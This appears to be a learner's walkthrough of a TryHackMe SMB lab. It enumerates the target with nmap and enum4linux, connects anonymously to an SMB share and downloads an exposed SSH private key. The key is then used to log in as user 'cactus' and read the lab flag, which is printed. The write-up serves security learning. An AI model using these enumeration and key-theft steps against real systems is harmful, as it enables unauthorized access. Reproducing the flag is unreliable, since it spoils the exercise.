# TryHackMe - SMB Enumeration Notes

## Goal

Find information exposed through SMB and use it to gain access to the target machine.

Target:

10.48.139.111

Hostname:

POLOSMB

---

# Step 0: Connect to TryHackMe VPN

Command:

sudo openvpn file.ovpn

Success indicator:

Initialization Sequence Completed

Meaning:

* VPN tunnel created
* Can reach TryHackMe private network
* tun0 interface created

Verify:

ip addr show tun0

Expected:

inet 192.168.x.x

---

# Step 1: Check Connectivity

Command:

ping 10.48.139.111

Purpose:

Check whether target is reachable.

Interpretation:

64 bytes from 10.48.139.111

Means:

* Host is alive
* Routing works
* VPN works

---

# Step 2: Port Scanning with Nmap

Command:

nmap -Pn 10.48.139.111

Purpose:

Find open ports.

Mental Model:

Computer = Building

Ports = Doors

Examples:

22  -> SSH
80  -> HTTP
443 -> HTTPS
445 -> SMB

Result:

139/tcp open
445/tcp open

Observation:

SMB is running.

---

# Nmap Switches Used

## -Pn

Treat host as alive.

Without:

Nmap sends ping first.

With:

Scan even if ping is blocked.

Useful in CTFs.

---

## -sC

Run default NSE scripts.

Provides:

* Hostnames
* SMB info
* Certificates
* Extra enumeration

Example:

nmap -sC 10.48.139.111

---

## -sV

Version detection.

Example:

Without:

445 open microsoft-ds

With:

445 open Samba smbd 4

Purpose:

Identify exact service/version.

---

## -p

Specify ports.

Examples:

-p 80
-p 80,443
-p 139,445

Important mistake:

nmap -p 139,445 ...

ONLY scans those ports.

It does NOT discover new ports.

---

# SMB Basics

SMB = Server Message Block

Purpose:

File and printer sharing over network.

Common ports:

139 -> NetBIOS SMB
445 -> Direct SMB

When you see:

139 open
445 open

Think:

"SMB enumeration opportunity."

---

# Step 3: Enumerate SMB

Tool:

enum4linux

Command:

enum4linux 10.48.139.111

Purpose:

Ask SMB server:

* Hostname?
* Users?
* Shares?
* Anonymous access?
* Password policy?

Think:

enum4linux = SMB detective

---

# Important enum4linux Findings

## Hostname

Output:

POLOSMB

Meaning:

Machine name.

---

## Workgroup

Output:

WORKGROUP

Meaning:

Not joined to Active Directory.

---

## Anonymous Access

Output:

Server allows sessions using username '', password ''

Meaning:

Guest access enabled.

No username/password required.

Very important finding.

---

## Shares

Output:

netlogon
profiles
print$
IPC$

Meaning:

Network shared folders.

---

## Accessible Share

Output:

profiles Mapping: OK Listing: OK

Interpretation:

Mapping OK

=

Can connect.

Listing OK

=

Can view contents.

Important:

This does NOT mean we saw files yet.

Only means access is allowed.

---

## Users Found

Output:

Unix User\cactus
Unix User\ubuntu
POLOSMB\nobody

Meaning:

Valid local accounts.

Found via RID cycling.

---

# What is RID Cycling?

Think:

Ask server:

User 1000?
User 1001?
User 1002?

Until something exists.

Example:

1000 -> cactus

1001 -> ubuntu

---

# Step 4: Access SMB Share

Command:

smbclient //10.48.139.111/profiles -N

Breakdown:

smbclient

=

SMB client.

profiles

=

Share name.

-N

=

No password.

Meaning:

Connect anonymously to profiles share.

---

# SMBClient Basics

After connecting:

smb: >

Useful commands:

ls

List files.

cd folder

Change directory.

get file

Download file.

exit

Leave share.

---

# Share Contents

Found:

.ssh
Working From Home Information.txt

Important observation:

The share exposed a user's home/profile directory.

---

# SSH Directory

Directory:

.ssh

Purpose:

Stores SSH authentication data.

Interesting files:

id_rsa
id_rsa.pub
authorized_keys

---

# SSH Key Files

## id_rsa

Private key.

KEEP SECRET.

Equivalent to:

Physical key.

---

## id_rsa.pub

Public key.

Equivalent to:

Lock.

Safe to share.

---

## authorized_keys

Contains public keys allowed to log in.

If your private key matches one of these public keys:

SSH login succeeds.

---

# Attack Path

1. SMB share exposed
2. Anonymous access allowed
3. Found .ssh directory
4. Downloaded id_rsa
5. Logged in through SSH

This is NOT exploiting SSH.

This is abusing exposed credentials.

---

# Download Key

Inside smbclient:

get id_rsa

Fix permissions:

chmod 600 id_rsa

Why?

SSH refuses insecure private keys.

---

# SSH Login

Command:

ssh -i id_rsa cactus@10.48.139.111

Breakdown:

-i id_rsa

Use this private key.

cactus

Username.

10.48.139.111

Target machine.

---

# SSH Authentication Logic

Server contains:

authorized_keys

You possess:

id_rsa

If they match:

Login succeeds.

Think:

authorized_keys = lock

id_rsa = key

---

# Successful Access

Prompt:

cactus@POLOSMB:~$

Meaning:

User = cactus

Machine = POLOSMB

Not root.

---

# Flag

Command:

cat smb.txt

Output:

THM{smb_is_fun_eh?}

---

# Key Lessons

Enumeration > Exploitation

Always ask:

1. What ports are open?
2. What services are running?
3. Are there usernames?
4. Are there shares?
5. Is anonymous access allowed?
6. Can credentials be recovered?

Most CTF and real-world compromises start with information leakage rather than fancy exploits.
